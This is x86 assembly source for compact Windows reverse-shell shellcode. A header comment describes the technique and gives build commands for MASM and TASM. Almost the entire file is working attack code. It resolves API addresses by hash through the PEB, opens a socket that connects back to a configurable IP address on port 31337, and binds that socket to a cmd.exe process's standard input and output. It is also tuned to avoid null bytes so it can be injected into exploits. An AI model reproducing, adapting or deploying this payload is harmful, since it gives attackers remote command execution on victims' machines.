comment ~

	reverse connect to localhost port 31337 using WSASocketA handle for
	input/output to cmd.exe process.
	
	It works, because the socket is created *without* overlapped attribute..
	
	From the best of my knowledge, David Litchfield used this idea in shellcode first.

	size -> 241 bytes
	
	Works really well..but this hasn't been finished as well as it could have been.
	I remember also reading about the effectiveness of using this code within
	a GUI application..it won't work.
	
	You have to first create a console using AllocConsole API, but its not
	included in this.
	
	This should be null-byte free, apart from the ip address.

	MASM
	
	ml /DMASM /c /Cp /coff /IC:\MASM32\INCLUDE rev_overlap.asm
	link /SUBSYSTEM:CONSOLE /LIBPATH:C:\MASM32\LIB /SECTION:.text,W rev_overlap.obj


	TASM

	implib -c -f -o -i import32.lib %SYSTEMROOT%\system32\kernel32.dll %SYSTEMROOT%\system32\ws2_32.dll
	tasm32 /dTASM /ml /m9 rev_overlap.asm
	tlink32 /Tpe /ap /x rev_overlap.obj,,,import32.lib

	bcom@hushmail.com

~
.586
.model flat,stdcall

IFDEF MASM
include <kernel32.inc>
include <ws2_32.inc>
.data
pad	db	0
.code
ENDIF

IFDEF TASM
extrn	ExitProcess	:proc
extrn	WSAStartup	:proc
.code
	ret
.data
ENDIF

HOST_ADDRESS	textequ	<00100007fh>		; localhost ip address

	hLoadLibraryA		EQU	ebp+04
	hCreateProcessA		EQU	ebp+08
	hWaitForSingleObject	EQU	ebp+12

	hWSASocketA			EQU	ebp+16
	hconnect			EQU	ebp+20
 
HASH_CONSTANT	EQU	7

;					macro for generating 16-bit api hashes
hashapi	macro	szApi
	local	dwHash
	dwHash = 0

	forc x, <szApi>
		dwHash = dwHash + "&x"
		dwHash = (dwHash shl HASH_CONSTANT) or (dwHash shr (32-HASH_CONSTANT))
	endm
	dwHash = dwHash and 0ffffh
	dw	dwHash
endm

	assume	fs:nothing

main:
	mov	eax, end_code-entry_point
	sub	esp, 200h
	push	esp
	push	02h
	call	WSAStartup			; just here for testing.
	add	esp, 200h
	;---------------------
;#######################################################################

entry_point:
	add	esp, -20			; create 20 byte stack frame
	
	mov	edi, esp			; edi + ebp will be pointers to api
	mov	ebp, esp
	add	ebp, -4
						; get position in memory
	push	0c356565eh			; pop esi/push esi/push esi/ret
	mov	eax, esp
	call	eax
mem_position:	
	inc	byte ptr [esi + (pws32End - mem_position)]	; nullify byte
	lea	esi, [esi + (hashed_api - mem_position)]
	jmp	getk32base
hashed_api:
	hashapi <LoadLibraryA>
	hashapi <CreateProcessA>
	hashapi <WaitForSingleObject>

	db	"ws2_32",0ffh,0ffh
pws32End	EQU	$-2

	hashapi <WSASocketA>
	hashapi <connect>
getk32base:
	push	30h
	pop	ecx
	mov	eax, fs:[ecx]
	mov	eax, [eax + 0ch]
	mov	eax, [eax + 1ch]
	mov	eax, [eax]
	mov	ebx, [eax + 08h]
	;---------------------
	mov	cl, 03h
get_apis:
	pushad
	movzx	eax, word ptr [ebx + 3ch]
	mov	esi, [eax + ebx + 78h]
	lea	esi, [ebx + esi + 1ch]
	mov	cl, 03h
load_rva:
	lodsd
	add	eax, ebx
	push	eax
	loop	load_rva
	pop	ebp
	pop	edi
load_index:
	mov	esi, [edi + 4 * ecx]
	add	esi, ebx
	xor	eax, eax
	cdq
hash_export:
	lodsb
	add	edx, eax
	rol	edx, HASH_CONSTANT
	dec	eax
	jns	hash_export
	ror	edx, HASH_CONSTANT
	inc	ecx
	mov	esi, [esp + 08]
	lodsd
	cmp	ax, dx
	jne	load_index
	;-----------------
	dec	ecx
	pop	esi
	xchg	eax, ebp
	movzx	edx,  word ptr [eax + 2 * ecx]
	add	ebx, dword ptr [esi + 4 * edx]
	mov	[esp + 28], ebx
	popad
	inc	esi
	inc	esi
	stosd
	loop	get_apis

	push	esi
	call	dword ptr [hLoadLibraryA]
	xchg	eax, ebx
	lodsd
	lodsd
	;------------------------------
	push	2
	pop	ecx
	dec	edx
	jnz	get_apis

	push	ebx		; 0
	push	ebx
	push	ebx
	push	ebx		; IPPROTO_IP
	push	1		; SOCK_STREAM
	push	ecx		; AF_INET
	call	dword ptr [hWSASocketA]
	xchg	eax, ebx

	push	HOST_ADDRESS		; 00100007fh			; 127.0.0.1 / NULL bytes here!!!
	push	0697a0102h			; 31337,AF_INET
	mov	edx, esp
	dec	byte ptr [esp + 1]	; nullify byte

	push	16				; sizeof sockaddr_in
	push	edx				; *sockaddr_in
	push	ebx				; handle of socket
	call	dword ptr [hconnect]

	push	0ff646d63h			; 'dmc' / "cmd",0ffh
	mov	edx, esp
	inc	byte ptr [edx + 3]	; nullify byte

	push	eax			; PROCESS_INFORMATION
	push	eax
	push	eax
	push	eax
	mov	esi, esp
	;-------------		; STARTUPINFO
	push	ebx			; hStdError / handle of socket
	push	ebx			; hStdInput
	push	ebx			; hStdOutput
	;--------
	push	eax
	push	eax
	
	push	ax
	pushw	0101h	;db	66h,68h,01h,01h	; 16-bit push 0101h
	;---------
	push	11
	pop	ecx
push_stinfo:
	push	eax
	loop	push_stinfo
	mov	ecx, esp

	push	esi			;offset lpProcessInformation
	push	ecx
	push	eax
	push	eax
	push	eax
	push	1			;TRUE
	push	eax
	push	eax
	push	edx			;offset szCmd
	push	eax
	call	dword ptr [hCreateProcessA]

	push	-1						; INFINITE
	lodsd
	push	eax						; process handle
	call	dword ptr [hWaitForSingleObject]
end_code:
	push	0
	call	ExitProcess		; here for test, and because Win2k/XP crash with no API imports in PE file.
end	main